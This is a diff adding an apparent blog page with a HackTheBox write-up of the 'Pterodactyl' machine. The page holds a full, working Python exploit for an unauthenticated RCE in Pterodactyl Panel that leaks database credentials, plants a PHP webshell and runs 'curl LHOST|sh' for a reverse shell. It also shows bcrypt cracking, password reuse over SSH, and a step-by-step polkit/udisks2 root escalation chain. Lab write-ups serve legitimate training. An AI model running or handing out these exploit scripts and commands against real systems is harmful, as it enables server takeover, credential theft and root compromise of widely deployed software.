@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/pterodactyl.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] Pterodactyl - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-medium">medium</span>
+                    <span class="article-cat">· linux / web</span>
+                </div>
+
+                <h1>Pterodactyl</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">Pterodactyl</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">pterodactyl panel</span>
+                    <span class="tag">cve-2025-49132 unauth rce</span>
+                    <span class="tag">pearcmd path traversal</span>
+                    <span class="tag">bcrypt crack</span>
+                    <span class="tag">udisks2 polkit lpe (cve-2025-6018/6019)</span>
+                </div>
+
+                <img src="../../images/hackthebox/pterodactyl/index.png" alt="Pterodactyl Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>Recon</h2>
+
+                <p>Starting with <code>nmap</code>. SSH and an nginx front end on 80, everything else filtered.</p>
+
+                <pre><code>[Pterodactyl] nmap -Pn -sSVC -p- -T5 --min-rate 2000 -oN nmap 10.129.16.81
+Nmap scan report for pterodactyl.htb (10.129.16.81)
+Host is up (0.31s latency).
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
+80/tcp   open   http       nginx 1.21.5
+|_http-title: My Minecraft Server
+|_http-server-header: nginx/1.21.5
+443/tcp  closed https
+8080/tcp closed http-proxy</code></pre>
+
+                <p>Port 80 is a marketing page for a Minecraft hosting service, which is exactly what <a href="https://pterodactyl.io/">Pterodactyl</a> (a game server management panel) is used for. Enumerating virtual hosts under <code>pterodactyl.htb</code> reveals <code>panel.pterodactyl.htb</code>, which serves the Pterodactyl Panel login. I added it to <code>/etc/hosts</code>.</p>
+
+                <h2>Exploitation</h2>
+
+                <p>The panel is vulnerable to <a href="https://www.cve.org/CVERecord?id=CVE-2025-49132">CVE-2025-49132</a>, an unauthenticated remote code execution bug. The <code>/locales/locale.json</code> endpoint loads a translation file with <code>require()</code> based on user controlled <code>locale</code> and <code>namespace</code> parameters. Because those values are not sanitised, you can path traverse out of the language directory and force PHP to include any file on disk. With <code>register_argc_argv = On</code> (the default on this install), that is enough to reach PEAR's <code>pearcmd.php</code>, abuse its <code>config-create</code> command to write an attacker controlled PHP file anywhere, and then include that file to execute code.</p>
+
+                <p>I automated the whole flow with a small script: it confirms the endpoint is vulnerable, dumps the app config (leaking <code>APP_KEY</code> and the MySQL credentials), drops a one line webshell with the <code>pearcmd</code> trick, and finally invokes it to fetch and run a reverse shell.</p>
+
+                <pre><code>#!/usr/bin/env python3
+"""
+CVE-2025-49132 - Pterodactyl Panel Unauthenticated RCE
+=====================================================
+Exploits path traversal in /locales/locale.json to:
+1. Leak config files (DB creds, APP_KEY, etc.)
+2. Load pearcmd.php via path traversal to write a PHP webshell
+3. Execute arbitrary commands through the webshell
+
+Requires: register_argc_argv = On (confirmed via phpinfo)
+"""
+
+import http.client
+import sys
+import urllib.parse
+import json
+
+TARGET = "panel.pterodactyl.htb"
+LHOST = "HOST"
+
+# Path traversal from /var/www/pterodactyl/resources/lang/ to /
+# 5 levels of ../ reaches filesystem root
+PEAR_PATHS = [
+    "../../../../../usr/share/php/PEAR",  # SUSE/openSUSE
+    "../../../../../usr/share/php",
+    "../../../../../usr/share/php8",
+    "../../../../../usr/local/lib/php",
+    "../../../../../usr/share/pear",
+]
+
+WEBSHELL = "&lt;?=system($_GET[0])?&gt;"
+SHELL_PATH = "/tmp/shell.php"
+SHELL_LOCALE = "../../../../../tmp"
+SHELL_NS = "shell"
+
+
+def raw_get(path, timeout=10):
+    """Send a raw GET request without URL encoding."""
+    conn = http.client.HTTPConnection(TARGET, 80, timeout=timeout)
+    conn.request("GET", path)
+    resp = conn.getresponse()
+    body = resp.read().decode(errors="replace")
+    conn.close()
+    return resp.status, body
+
+
+def check_vuln():
+    """Check if target is vulnerable to CVE-2025-49132."""
+    status, body = raw_get(
+        "/locales/locale.json?locale=../../config/prologue&amp;namespace=alerts"
+    )
+    return status == 200 and "alert_messages" in body
+
+
+def dump_config(locale, namespace, label=""):
+    """Dump a config file via path traversal."""
+    status, body = raw_get(
+        f"/locales/locale.json?locale={locale}&amp;namespace={namespace}"
+    )
+    if status == 200:
+        try:
+            data = json.loads(body)
+            return data.get(locale, {}).get(namespace, {})
+        except json.JSONDecodeError:
+            pass
+    return None
+
+
+def write_webshell():
+    """Write PHP webshell to disk using pearcmd.php config-create trick.
+
+    The query string serves dual purposes:
+    - For Laravel: extracts locale/namespace to load pearcmd.php
+    - For pearcmd: argv split by '+' gives config-create command
+    """
+    for pear_path in PEAR_PATHS:
+        # URL structure:
+        # ?+config-create+/  =&gt; argv[1]="config-create", argv[2] starts with "/"
+        # &amp;locale=PATH        =&gt; Laravel loads PATH/pearcmd.php
+        # &amp;namespace=pearcmd   =&gt; targets pearcmd.php file
+        # &amp;/PAYLOAD           =&gt; embedded in argv[2] (the root dir)
+        # +/tmp/shell.php     =&gt; argv[3] = output file
+        url = (
+            f"/locales/locale.json?"
+            f"+config-create+/"
+            f"&amp;locale={pear_path}"
+            f"&amp;namespace=pearcmd"
+            f"&amp;/{WEBSHELL}"
+            f"+{SHELL_PATH}"
+        )
+        print(f"  [*] Trying {pear_path}/pearcmd.php ...")
+        status, body = raw_get(url)
+
+        # pearcmd outputs "Successfully created default configuration"
+        if "success" in body.lower() or "created" in body.lower():
+            print(f"  [+] pearcmd found! Webshell written to {SHELL_PATH}")
+            return True
+        # Check if we got a non-empty response (pearcmd executed but different output)
+        if status == 200 and len(body) &gt; 50 and "PEAR" in body:
+            print(f"  [+] pearcmd likely found! Response contains PEAR output")
+            return True
+
+    return False
+
+
+def verify_webshell():
+    """Verify the webshell was written by loading it without a command."""
+    url = f"/locales/locale.json?locale={SHELL_LOCALE}&amp;namespace={SHELL_NS}"
+    status, body = raw_get(url, timeout=5)
+    # If the file exists and is loaded, we'll get a response (possibly with PEAR config text)
+    return status == 200 and len(body) &gt; 10
+
+
+def execute_command(cmd, timeout=30):
+    """Execute a command via the webshell loaded through locale.json.
+
+    The locale.json endpoint uses require() to load the file,
+    which executes our embedded &lt;?=system($_GET[0])?&gt; code.
+    """
+    # URL-encode the command for the GET parameter
+    encoded_cmd = urllib.parse.quote(cmd, safe="")
+    url = (
+        f"/locales/locale.json?"
+        f"locale={SHELL_LOCALE}"
+        f"&amp;namespace={SHELL_NS}"
+        f"&amp;0={encoded_cmd}"
+    )
+    try:
+        status, body = raw_get(url, timeout=timeout)
+        return status, body
+    except Exception as e:
+        return -1, str(e)
+
+
+def main():
+    print("=" * 60)
+    print("  CVE-2025-49132 - Pterodactyl Panel RCE")
+    print("  via pearcmd.php config-create trick")
+    print("=" * 60)
+    print(f"  Target : http://{TARGET}/")
+    print(f"  LHOST  : {LHOST}")
+    print(f"  Command: curl {LHOST} | sh")
+    print("=" * 60)
+    print()
+
+    # Step 1: Check vulnerability
+    print("[1/4] Checking if target is vulnerable...")
+    if not check_vuln():
+        print("  [-] Target is NOT vulnerable!")
+        sys.exit(1)
+    print("  [+] Target is vulnerable!\n")
+
+    # Step 2: Dump credentials
+    print("[2/4] Dumping configuration...")
+    app_config = dump_config("../../config", "app")
+    if app_config:
+        print(f"  [+] Version : {app_config.get('version', 'N/A')}")
+        print(f"  [+] APP_KEY : {app_config.get('key', 'N/A')}")
+
+    db_config = dump_config("../../config", "database")
+    if db_config:
+        mysql = db_config.get("connections", {}).get("mysql", {})
+        print(f"  [+] DB Host : {mysql.get('host', 'N/A')}:{mysql.get('port', 'N/A')}")
+        print(f"  [+] DB Name : {mysql.get('database', 'N/A')}")
+        print(f"  [+] DB User : {mysql.get('username', 'N/A')}")
+        print(f"  [+] DB Pass : {mysql.get('password', 'N/A')}")
+    print()
+
+    # Step 3: Write webshell via pearcmd.php
+    print("[3/4] Writing webshell via pearcmd config-create...")
+    if not write_webshell():
+        print("  [-] Failed to write webshell via pearcmd!")
+        print("  [-] pearcmd.php may not be installed or path is different")
+        sys.exit(1)
+    print()
+
+    # Verify webshell
+    print("  [*] Verifying webshell...")
+    if verify_webshell():
+        print(f"  [+] Webshell at {SHELL_PATH} is accessible!\n")
+    else:
+        print("  [!] Could not verify webshell (might still work)\n")
+
+    # Step 4: Execute reverse shell
+    print("[4/4] Executing reverse shell...")
+    print("  [*] Make sure your listener is running: nc -lvnp 1337")
+    print("  [*] Make sure your HTTP server is running: python3 -m http.server 80")
+    print()
+
+    # Try curl first, then wget as fallback
+    for cmd in [f"curl {LHOST}|sh", f"wget -O- {LHOST}|sh"]:
+        print(f"  [*] Trying: {cmd}")
+        status, body = execute_command(cmd, timeout=60)
+        if status == -1:
+            print(f"  [+] Request timed out - reverse shell likely connected!")
+            break
+        else:
+            print(f"  [*] Response status: {status}")
+            if body:
+                lines = [l for l in body.split("\n") if l.strip() and "PEAR" not in l]
+                preview = "\n".join(lines[:10])
+                if preview.strip():
+                    print(f"  [*] Output:\n{preview}")
+            print(f"  [*] Trying next method...")
+
+
+if __name__ == "__main__":
+    main()</code></pre>
+
+                <p>Point the script's <code>LHOST</code> at a hosted <code>shell.sh</code>, start a listener and a web server, then run it:</p>
+
+                <pre><code>[Pterodactyl] nc -lvnp 4444
+[Pterodactyl] python3 -m http.server 80        # serving shell.sh
+[Pterodactyl] python3 script.py
+
+[1/4] Checking if target is vulnerable...
+  [+] Target is vulnerable!
+[2/4] Dumping configuration...
+  [+] APP_KEY : base64:...
+  [+] DB User / DB Pass : (from config/database)
+[3/4] Writing webshell via pearcmd config-create...
+  [+] pearcmd found! Webshell written to /tmp/shell.php
+[4/4] Executing reverse shell...</code></pre>
+
+                <p>The webshell runs <code>curl LHOST | sh</code>, the hosted <code>shell.sh</code> connects back, and the listener catches a shell as the panel's web user.</p>
+
+                <h2>Post Exploitation</h2>
+
+                <p>The config dump from the exploit already gives the MySQL credentials the panel uses. Connecting with them and dumping the <code>users</code> table hands over the panel accounts and their bcrypt hashes:</p>
+
+                <pre><code>| headmonitor  | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 |
+| phileasfogg3 | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi |</code></pre>
+
+                <p>The <code>phileasfogg3</code> hash falls to rockyou:</p>
+
+                <pre><code>[Pterodactyl] hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
+$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi:!QAZ2wsx</code></pre>
+
+                <p>The password is reused for the system account, so it is a direct SSH login and the user flag:</p>
+
+                <pre><code>[Pterodactyl] ssh phileasfogg3@pterodactyl.htb
+phileasfogg3@pterodactyl:~$ cat ~/user.txt</code></pre>
+
+                <h2>Privilege Escalation</h2>
+
+                <p>The host is openSUSE, and it is vulnerable to the <a href="https://www.cve.org/CVERecord?id=CVE-2025-6018">CVE-2025-6018</a> plus <a href="https://www.cve.org/CVERecord?id=CVE-2025-6019">CVE-2025-6019</a> chain. The first bug lets a remote SSH session be treated as a local, active session by polkit. The second uses <code>udisks2</code>'s <code>Filesystem.Resize</code>, which temporarily mounts an XFS loop device <strong>without the <code>nosuid</code> flag</strong>, letting you run a SUID root binary staged inside the image.</p>
+
+                <p>Step one is the polkit bypass. Writing <code>~/.pam_environment</code> forces the SSH session to advertise itself as seat0, then reconnecting applies it:</p>
+
+                <pre><code>phileasfogg3@pterodactyl:~$ printf 'XDG_SEAT OVERRIDE=seat0\nXDG_VTNR OVERRIDE=1\n' &gt; ~/.pam_environment
+phileasfogg3@pterodactyl:~$ exit
+[Pterodactyl] ssh phileasfogg3@pterodactyl.htb
+
+phileasfogg3@pterodactyl:~$ gdbus call --system --dest org.freedesktop.login1 \
+  --object-path /org/freedesktop/login1 \
+  --method org.freedesktop.login1.Manager.CanReboot
+('yes',)</code></pre>
+
+                <p>A <code>('yes',)</code> means polkit now trusts the session as active. Next, build an XFS image and rewrite its root inode so I own it, which lets me mount it via udisks and copy a fresh <code>/bin/bash</code> inside:</p>
+
+                <pre><code>phileasfogg3@pterodactyl:~$ dd if=/dev/zero of=/tmp/xfs.image bs=1M count=300 status=none
+phileasfogg3@pterodactyl:~$ /sbin/mkfs.xfs -f -q /tmp/xfs.image
+phileasfogg3@pterodactyl:~$ /usr/sbin/xfs_db -x \
+    -c "inode 128" \
+    -c "write -d core.uid $(id -u)" \
+    -c "write -d core.gid $(id -g)" /tmp/xfs.image
+
+phileasfogg3@pterodactyl:~$ udisksctl loop-setup --file /tmp/xfs.image --no-user-interaction
+phileasfogg3@pterodactyl:~$ udisksctl mount -b /dev/loop0 --no-user-interaction
+phileasfogg3@pterodactyl:~$ MNTPOINT=$(mount | grep loop0 | awk '{print $3}')
+phileasfogg3@pterodactyl:~$ cp /bin/bash "$MNTPOINT/bash"
+phileasfogg3@pterodactyl:~$ udisksctl unmount -b /dev/loop0 --no-user-interaction
+phileasfogg3@pterodactyl:~$ udisksctl loop-delete -b /dev/loop0 --no-user-interaction</code></pre>
+
+                <p>With the image unmounted, patch the copied bash's inode directly on disk to make it SUID root:</p>
+
+                <pre><code>phileasfogg3@pterodactyl:~$ /usr/sbin/xfs_db -x \
+    -c "path /bash" \
+    -c "write -d core.uid 0" \
+    -c "write -d core.gid 0" \
+    -c "write -d core.mode 0104555" /tmp/xfs.image</code></pre>
+
+                <p>Now trigger the resize. The temporary mount that <code>udisks2</code> creates during <code>Filesystem.Resize</code> lands in <code>/tmp/blockdev.*</code> without <code>nosuid</code> and only exists for a moment, so a tight background watcher executes the SUID bash straight from that mount point before it disappears:</p>
+
+                <pre><code>phileasfogg3@pterodactyl:~$ (while true; do
+    for d in /tmp/blockdev*/bash; do
+        [ -f "$d" ] &amp;&amp; "$d" -p -c 'id; cat /root/root.txt' &gt; /tmp/root_output.txt 2&gt;&amp;1 &amp;&amp; break 2
+    done
+    sleep 0.001
+done) &amp;
+
+phileasfogg3@pterodactyl:~$ udisksctl loop-setup --file /tmp/xfs.image --no-user-interaction
+phileasfogg3@pterodactyl:~$ gdbus call --system --dest org.freedesktop.UDisks2 \
+  --object-path "/org/freedesktop/UDisks2/block_devices/loop0" \
+  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'</code></pre>
+
+                <p>The watcher fires the SUID root bash inside that window, and <code>/tmp/root_output.txt</code> comes back with a root id and the flag:</p>
+
+                <pre><code>phileasfogg3@pterodactyl:~$ cat /tmp/root_output.txt
+uid=1000(phileasfogg3) gid=1000(phileasfogg3) euid=0(root) groups=...
+[root.txt contents]</code></pre>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // Pterodactyl</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
